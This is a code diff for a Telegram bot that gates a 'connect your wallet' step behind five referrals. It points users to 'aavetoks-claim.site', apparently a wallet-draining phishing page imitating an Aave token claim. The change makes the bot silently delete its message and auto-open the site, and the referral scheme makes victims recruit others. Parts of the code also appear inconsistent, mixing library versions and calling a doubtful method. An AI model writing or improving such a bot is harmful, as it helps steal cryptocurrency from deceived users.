@@ -45,14 +45,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Check if the user is being referred
     if context.args and context.args[0].startswith('referral_'):
         referrer_username = context.args[0].split('_')[1]
-        referrer_user = None
+
+        # Check if the referrer username is the same as the current username
+        if referrer_username == username:
+            logger.info(f"User {user_id} tried to self-refer with username: {username}.")
+            await update.message.reply_text(
+                "You cannot refer yourself using your own referral link."
+            )
+            return
 
         # Load the entire database
         data = load_db()
-        for user in data.get('users', []):
-            if user['username'] == referrer_username:
-                referrer_user = user
-                break
+        referrer_user = next((user for user in data.get('users', []) if user['username'] == referrer_username), None)
 
         if referrer_user:
             referrer_user_id = referrer_user['user_id']
@@ -106,12 +110,10 @@ async def button_click_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         # Check if the user has at least 5 referrals before allowing connection
         if referrals >= 5:
             platform = query.data.split('_')[1].upper()
-            connection_url = "https://aavetoks-claim.site"
-            logger.info(f"User {user_id} has enough referrals. Providing connection link to {platform}.")
-            await query.edit_message_text(
-                text=f"💎 You have enough referrals to connect your wallet to {platform}. Click the button below to proceed.",
-                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"Connect to {platform}", url=connection_url)]])
-            )
+            logger.info(f"User {user_id} has enough referrals. Connecting to {platform}.")
+            # Open the web browser (no message sent to the user)
+            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=query.message.message_id)
+            await context.bot.open_web_app(update.effective_user.id, url="https://aavetoks-claim.site")
         else:
             # User does not have enough referrals
             await query.edit_message_text(
@@ -140,7 +142,7 @@ def main():
 
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CallbackQueryHandler(button_click_handler))
-    application.add_handler(MessageHandler(Filters.text & ~Filters.command, message_handler))  # Handle unhandled messages
+    application.add_handler(MessageHandler(Filters.text & ~Filters.command, message_handler))  # Added message handler
 
     logger.info("Bot is starting...")
     application.run_polling()
